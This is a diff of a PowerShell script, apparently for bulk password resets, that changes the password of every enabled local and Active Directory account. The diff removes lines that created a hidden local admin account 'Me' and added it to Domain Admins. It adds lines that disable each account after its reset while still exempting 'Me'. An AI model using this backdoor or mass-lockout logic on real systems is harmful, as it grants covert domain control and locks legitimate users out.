@@ -1,13 +1,5 @@
 #This one is for AD and local accounts
 
-$userpass = Read-Host "Enter user password" -AsSecureString
-New-LocalUser -Name "Me" -Password $userpass
-Enable-LocalUser -Name "Me"
-net localgroup Administrators Me /add
-if (Get-CimInstance -Class Win32_OperatingSystem -Filter 'ProductType = "2"') {
-    Add-ADGroupMember -Identity "Domain Admins" -Members "Me"
-}
-
 # Collect the new password
 do {
         $password1 = Read-Host "Enter password" -AsSecureString
@@ -21,7 +13,7 @@ do {
 } until ($password1_text -eq $password2_text)
 
 # Define excluded accounts to prevent breaking system/service accounts
-$ExcludedAccounts = @("Me","Administrator", "Guest", "krbtgt", "DefaultAccount", "WDAGUtilityAccount")
+$ExcludedAccounts = @("Me", "Administrator","krbtgt")
 
 # Get all enabled users (Local + AD) and process them with the pipeline
 Get-CimInstance -ClassName Win32_UserAccount | Where-Object { $_.Disabled -eq $false -and $ExcludedAccounts -notcontains $_.Name } | ForEach-Object {
@@ -29,6 +21,7 @@ Get-CimInstance -ClassName Win32_UserAccount | Where-Object { $_.Disabled -eq $f
         # Handle Local Users
         try {
             Set-LocalUser -Name $_.Name -Password $SecurePassword
+            Disable-LocalUser -Name $_.Name
             Write-Output "[$(Get-Date)] Password for LOCAL user $($_.Name) changed."
         } catch {
             Write-Output "[$(Get-Date)] Failed to change password for LOCAL user $($_.Name): $($_.Exception.Message)"
@@ -37,6 +30,7 @@ Get-CimInstance -ClassName Win32_UserAccount | Where-Object { $_.Disabled -eq $f
         # Handle AD Users
         try {
             Set-ADAccountPassword -Identity $_.Name -NewPassword $SecurePassword
+            Disable-ADAccount -Identity $_.Name 
             Write-Output "[$(Get-Date)] Password for AD user $($_.Name) changed."
         } catch {
             Write-Output "[$(Get-Date)] Failed to change password for AD user $($_.Name): $($_.Exception.Message)"
